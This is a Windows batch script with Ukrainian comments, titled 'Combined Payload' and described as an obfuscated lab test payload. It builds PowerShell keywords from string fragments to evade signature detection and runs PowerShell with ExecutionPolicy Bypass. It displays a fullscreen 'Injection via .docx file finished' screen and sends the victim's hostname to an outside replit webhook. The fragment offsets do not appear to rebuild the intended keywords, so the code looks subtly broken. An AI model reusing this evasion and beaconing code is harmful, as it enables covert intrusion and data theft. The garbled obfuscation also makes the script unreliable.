@echo off
chcp 65001 >nul
title Combined Payload

:: ============================================================
:: Лабораторний скрипт: обфускована версія test_003
:: ============================================================

:: Оголошення локальних змінних (імена без змісту)
set "X1=PowerShell"
set "X2=Add-Type"
set "X3=System.Windows.Forms"
set "X4=Invoke-RestMethod"
set "X5=PUT"
set "X6=application/json"

:: Збирання ключових слів із фрагментів (обхід сигнатур)
set "PwSh=%X1:~0,1%%X1:~5,1%%X1:~2,1%%X1:~6,1%%X1:~7,1%%X1:~1,1%%X1:~4,1%%X1:~8,1%%X1:~8,1%"
set "AddT=%X2:~0,1%%X2:~4,1%%X2:~4,1%%X2:~2,1%%X2:~3,1%%X2:~6,1%%X2:~7,1%%X2:~1,1%"
set "Asm=%X3:~0,1%%X3:~7,1%%X3:~8,1%%X3:~13,1%%X3:~2,1%%X3:~15,1%%X3:~5,1%%X3:~17,1%"
set "Irm=%X4:~0,1%%X4:~8,1%%X4:~10,1%%X4:~14,1%%X4:~7,1%%X4:~18,1%%X4:~3,1%%X4:~11,1%"
set "Mth=%X5%"
set "Cnt=%X6%"

:: Основний URL та текст
set "WEBHOOK_URL=https://eset-bot-sender--0xw1zard.replit.app/api/eset-webhook"
set "MSG_TEXT=Тестове повідомлення від Bad-Pi лабораторії"

:: Виконання через PowerShell з обфускованими аргументами
%PwSh% -NoProfile -ExecutionPolicy Bypass -Command ^
"%AddT% -AssemblyName %Asm%; ^
$f = New-Object %Asm:~0,21%.Form; ^
$f.FormBorderStyle = 'None'; ^
$f.WindowState = 'Maximized'; ^
$f.BackColor = 'Black'; ^
$l = New-Object %Asm:~0,21%.Label; ^
$l.Text = 'All is working. Injection via .docx file finished'; ^
$l.ForeColor = 'Red'; ^
$l.Font = New-Object System.Drawing.Font('Courier New', 48, [System.Drawing.FontStyle]::Bold); ^
$l.AutoSize = $false; ^
$l.TextAlign = 'MiddleCenter'; ^
$l.Dock = 'Fill'; ^
$f.Controls.Add($l); ^
$f.Add_KeyDown({ if($_.KeyCode -eq 'Escape') { $f.Close() } }); ^
$f.ShowDialog(); ^
$body = @{text='%MSG_TEXT%'; timestamp=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); hostname=$env:COMPUTERNAME} | ConvertTo-Json; ^
try { ^
    $response = %Irm% -Uri '%WEBHOOK_URL%' -Method %Mth% -Body $body -ContentType '%Cnt%'; ^
    Write-Host 'Success' ^
} catch { ^
    Write-Host 'Error' ^
}"

pause
